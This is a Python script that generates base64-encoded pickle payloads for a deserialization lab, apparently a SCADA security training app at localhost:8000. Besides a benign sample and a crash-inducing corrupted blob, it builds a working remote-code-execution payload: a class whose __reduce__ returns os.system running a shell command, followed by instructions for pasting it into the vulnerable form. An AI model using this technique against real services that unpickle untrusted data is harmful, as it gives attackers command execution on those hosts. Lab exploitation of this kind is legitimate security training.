#!/usr/bin/env python3
"""
Deserialization Vulnerability Payload Generator
Usage: python3 create_pickle_payload.py
"""
import pickle
import base64

print("=" * 60)
print("DESERIALIZATION PAYLOAD GENERATOR")
print("=" * 60)

# 1. NORMAL PAYLOAD (Safe - for demonstration)
print("\n1. NORMAL PAYLOAD (Safe):")
normal_data = {
    'cpu_usage': 75,
    'memory_usage': 60,
    'disk_usage': 45,
    'status': 'operational'
}
normal_pickle = pickle.dumps(normal_data)
normal_b64 = base64.b64encode(normal_pickle).decode('utf-8')
print(f"Data: {normal_data}")
print(f"Base64 Payload:\n{normal_b64}")

# 2. CORRUPTED PAYLOAD (Crashes the deserializer)
print("\n" + "=" * 60)
print("2. CORRUPTED PAYLOAD (Causes crash):")
corrupted_data = b"CORRUPTED_PICKLE_DATA_THAT_WILL_CRASH"
corrupted_b64 = base64.b64encode(corrupted_data).decode('utf-8')
print(f"Base64 Payload:\n{corrupted_b64}")

# 3. MALICIOUS PAYLOAD (RCE - for educational purposes only!)
print("\n" + "=" * 60)
print("3. MALICIOUS PAYLOAD (RCE - EDUCATIONAL ONLY):")
print("WARNING: This demonstrates code execution via pickle")

class MaliciousPayload:
    def __reduce__(self):
        import os
        # This will execute 'whoami' command when unpickled
        # Write to /app which is volume-mapped to host
        return (os.system, ('whoami > /app/pwned.txt && echo "RCE SUCCESS: Command executed at $(date)" >> /app/pwned.txt',))

malicious_pickle = pickle.dumps(MaliciousPayload())
malicious_b64 = base64.b64encode(malicious_pickle).decode('utf-8')
print(f"Base64 Payload:\n{malicious_b64}")
print("\nIf this payload is deserialized, it will:")
print("- Execute system command (whoami)")
print("- Create pwned.txt in current directory (volume-mapped)")
print("- You can see it at: scada_security_lab/pwned.txt")

print("\n" + "=" * 60)
print("USAGE INSTRUCTIONS:")
print("=" * 60)
print("1. Copy the Base64 payload above")
print("2. Go to: http://localhost:8000/vulnerable/deserialize/")
print("3. Paste the payload into the form")
print("4. Click 'Submit Diagnostic Data'")
print("5. Observe the result")
print("=" * 60)
